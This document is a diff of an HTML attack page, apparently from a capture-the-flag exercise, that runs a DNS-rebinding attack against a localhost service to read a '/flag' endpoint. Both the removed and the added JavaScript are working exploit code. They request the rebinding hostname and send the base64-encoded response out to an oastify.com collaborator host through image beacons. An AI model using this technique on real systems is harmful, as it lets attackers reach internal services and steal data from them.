@@ -4,31 +4,17 @@
 <script>
 const target = 'acd918ee.7f000001.rbndr.us';
 
-function attempt(round) {
-    const xhr = new XMLHttpRequest();
-    xhr.open('GET', `http://${target}:80/flag`, true);
-    xhr.withCredentials = true;
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-                const img = new Image();
-                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?success_${round}=` + btoa(xhr.responseText);
-            } else {
-                const img = new Image();
-                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${round}=` + btoa(`Status: ${xhr.status}`);
-            }
-        }
-    };
-    xhr.onerror = function() {
+// First, test if the domain resolves at all
+fetch(`http://${target}/`)
+    .then(r => r.text())
+    .then(data => {
         const img = new Image();
-        img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?xhr_error_${round}=` + btoa('XHR failed');
-    };
-    xhr.send();
-}
-
-for (let i = 1; i <= 100; i++) {
-    setTimeout(() => attempt(i), i * 300);
-}
+        img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?dns_works=` + btoa('RESOLVES: ' + data.substring(0, 100));
+    })
+    .catch(err => {
+        const img = new Image();
+        img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?dns_failed=` + btoa('DOMAIN NOT RESOLVING: ' + err.toString());
+    });
 </script>
 </body>
 </html>
